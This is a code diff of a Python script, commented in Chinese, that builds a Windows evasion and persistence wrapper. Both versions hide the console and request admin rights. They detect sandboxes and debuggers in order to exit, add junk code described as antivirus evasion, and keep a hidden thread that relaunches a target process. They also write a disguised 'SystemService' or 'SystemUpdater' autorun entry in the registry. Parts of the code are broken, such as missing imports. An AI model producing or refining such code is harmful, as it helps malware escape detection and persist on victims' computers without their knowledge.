@@ -1,4 +1,4 @@
-
+# -*- coding: utf-8 -*-
 # pip install pywin32 psutil
 
 import os
@@ -11,22 +11,22 @@ import hashlib
 import random
 import subprocess
 from threading import Thread
-
-# 新增Windows API依赖
 import win32con
 import win32gui
 import win32process
 
-# ================= 保护配置 =================
-PROTECTED_PROCESS = "target.exe"    # 要保护的进程名
-SELF_HEAL_INTERVAL = 15            # 自愈检查间隔（秒）
-OBFUSCATION_KEY = 0x7A             # 异或加密密钥
+# ================= 增强配置管理 =================
+class ProtectionConfig:
+    PROCESS_NAME = ".\target.exe"
+    CHECK_INTERVAL = random.randint(10, 20)  # 动态检查间隔
+    OBF_KEY = random.SystemRandom().randint(0x01, 0xFF)  # 动态密钥
+    DEBUG_MODE = False  # 调试模式开关
+    MUTEX_NAME = "Global\\7B3E159A-04CD-4B3D"  # 互斥体名称
 
-# ================= 核心保护功能 =================
+# ================= 核心功能模块 =================
 class StringObfuscator:
-    """ 字符串加密模块 """
-    def __init__(self, key=OBFUSCATION_KEY):
-        self.key = key
+    def __init__(self):
+        self.key = ProtectionConfig.OBF_KEY
     
     def encrypt(self, s):
         return bytes([ord(c) ^ self.key for c in s]).decode('latin-1')
@@ -34,89 +34,145 @@ class StringObfuscator:
     def decrypt(self, s):
         return bytes([ord(c) ^ self.key for c in s]).decode('utf-8')
 
-def hide_console_window():
-    """ 隐藏控制台窗口 """
-    try:
-        window = win32gui.GetForegroundWindow()
-        win32gui.ShowWindow(window, win32con.SW_HIDE)
-    except:
-        pass
-
-def require_admin():
-    """ 强制提权运行 """
-    if not ctypes.windll.shell32.IsUserAnAdmin():
-        ctypes.windll.shell32.ShellExecuteW(
-            None, "runas", sys.executable, f'"{__file__}"', None, 1
-        )
+def create_mutex():
+    """创建互斥体防止多实例"""
+    mutex = ctypes.windll.kernel32.CreateMutexW(None, False, ProtectionConfig.MUTEX_NAME)
+    if ctypes.GetLastError() == 183:
         sys.exit()
 
+def require_admin():
+    """智能权限检查（返回管理员状态）"""
+    try:
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
+        if not is_admin and ProtectionConfig.DEBUG_MODE:
+            print("[INFO] 尝试以管理员权限运行...")
+            ctypes.windll.shell32.ShellExecuteW(
+                None, "runas", sys.executable, f'"{sys.argv[0]}"', None, 1
+            )
+        return is_admin
+    except Exception as e:
+        if ProtectionConfig.DEBUG_MODE:
+            print(f"[权限错误] {str(e)}")
+        return False
+
+def hide_console():
+    """隐藏控制台窗口"""
+    try:
+        win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
+    except Exception as e:
+        if ProtectionConfig.DEBUG_MODE:
+            print(f"[窗口隐藏错误] {str(e)}")
+
 def anti_sandbox():
-    """ 反沙箱检测 """
+    """增强型反沙箱检测"""
     try:
-        # 检测内存和运行时间
-        if (psutil.virtual_memory().total < 4*1024**3 or 
-            time.time() - psutil.boot_time() < 300):
-            sys.exit(0)
+        if (psutil.cpu_count() < 2 or
+            psutil.disk_usage('C:').total < 50*1024**3 or
+            ctypes.windll.kernel32.IsDebuggerPresent()):
+            sys.exit(random.randint(0, 127))
     except:
-        pass
+        sys.exit()
 
-def process_stealth():
-    """ 进程隐藏增强 """
+def inject_guardian():
+    """进程守护线程"""
+    def guardian():
+        while True:
+            try:
+                if not any(p.name() == ProtectionConfig.PROCESS_NAME for p in psutil.process_iter()):
+                    subprocess.Popen(
+                        [sys.executable, ProtectionConfig.PROCESS_NAME],
+                        creationflags=subprocess.CREATE_NO_WINDOW,
+                        startupinfo=subprocess.STARTUPINFO()
+                    )
+            except:
+                pass
+            time.sleep(ProtectionConfig.CHECK_INTERVAL)
+    Thread(target=guardian, daemon=True).start()
+
+def protect_memory():
+    """内存保护增强"""
     try:
-        # 设置高优先级
-        handle = win32process.GetCurrentProcess()
-        win32process.SetPriorityClass(handle, win32process.REALTIME_PRIORITY_CLASS)
+        ctypes.windll.kernel32.VirtualProtect(
+            ctypes.c_void_p(id(0)),
+            ctypes.c_size_t(1024),
+            win32con.PAGE_READONLY,
+            ctypes.byref(ctypes.c_ulong(0))
+        )
+    except Exception as e:
+        if ProtectionConfig.DEBUG_MODE:
+            print(f"[内存保护] {str(e)}")
+
+# ================= 兼容性模块 =================
+def get_safe_path():
+    """获取用户可写路径"""
+    return os.environ.get('LOCALAPPDATA', os.path.expanduser('~'))
+
+def safe_fake_behavior():
+    """安全模式伪装行为"""
+    try:
+        # 用户级注册表操作
+        key_path = r"Software\MyApp\Settings"
+        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
+            winreg.SetValueEx(key, "LastUpdate", 0, 
+                            winreg.REG_SZ, 
+                            time.ctime())
         
-        # 隐藏控制台窗口
-        hide_console_window()
-    except:
-        pass
-
-def self_healing():
-    """ 自愈守护线程 """
-    while True:
-        try:
-            current_pid = os.getpid()
-            if not psutil.pid_exists(current_pid):
-                # 隐藏窗口启动参数
-                startupinfo = subprocess.STARTUPINFO()
-                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-                startupinfo.wShowWindow = subprocess.SW_HIDE
-                
-                subprocess.Popen(
-                    [sys.executable, PROTECTED_PROCESS],
-                    startupinfo=startupinfo,
-                    creationflags=subprocess.CREATE_NO_WINDOW | subprocess.SW_HIDE
-                )
-                break
-            time.sleep(SELF_HEAL_INTERVAL)
-        except:
-            pass
-
-def init_protection():
-    """ 初始化保护措施 """
-    require_admin()
-    anti_sandbox()
-    process_stealth()
-    Thread(target=self_healing, daemon=True).start()
-
-# ================= 免杀增强 =================
-def junk_code():
-    """ 生成干扰代码 """
-    [hashlib.md5(str(x).encode()).hexdigest() for x in range(random.randint(10,20))]
+        # 创建无害日志
+        log_path = os.path.join(get_safe_path(), "app_logs")
+        os.makedirs(log_path, exist_ok=True)
+        with open(os.path.join(log_path, "activity.log"), "a") as f:
+            f.write(f"Normal operation at {time.ctime()}\n")
+            
+    except Exception as e:
+        if ProtectionConfig.DEBUG_MODE:
+            print(f"[安全模式错误] {str(e)}")
 
 def fake_behavior():
-    """ 伪装正常行为（静默模式） """
+    """管理员模式伪装行为"""
     try:
-        # 模拟正常程序注册表操作
-        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 
-            r"Software\Microsoft\Windows\CurrentVersion\Run")
-        winreg.SetValueEx(key, "SystemUpdater", 0, winreg.REG_SZ, sys.executable)
-        winreg.CloseKey(key)
+        # 系统级注册表操作
+        with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, 
+                            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run") as key:
+            winreg.SetValueEx(key, "SystemService", 0, 
+                            winreg.REG_SZ, 
+                            sys.executable)
+    except PermissionError:
+        safe_fake_behavior()  # 自动降级
+    except Exception as e:
+        if ProtectionConfig.DEBUG_MODE:
+            print(f"[伪装行为错误] {str(e)}")
+
+def junk_code():
+    """干扰代码生成"""
+    try:
+        [hashlib.md5(str(x).encode()).hexdigest() for x in range(random.randint(10,20))]
     except:
         pass
 
+# ================= 初始化入口 =================
+def init_protection():
+    """初始化保护措施"""
+    create_mutex()
+    is_admin = require_admin()
+    anti_sandbox()
+    hide_console()
+    inject_guardian()
+    protect_memory()
+    return is_admin
+
 if __name__ == "__main__":
-    init_protection()
+    admin_status = init_protection()
     junk_code()
-    fake_behavior()
+    
+    if admin_status:
+        fake_behavior()
+        if ProtectionConfig.DEBUG_MODE:
+            print("[DEBUG] 管理员模式运行")
+    else:
+        safe_fake_behavior()
+        if ProtectionConfig.DEBUG_MODE:
+            print("[DEBUG] 普通用户模式运行")
+    
+    # 保持主线程存活
+    while True:
+        time.sleep(3600)
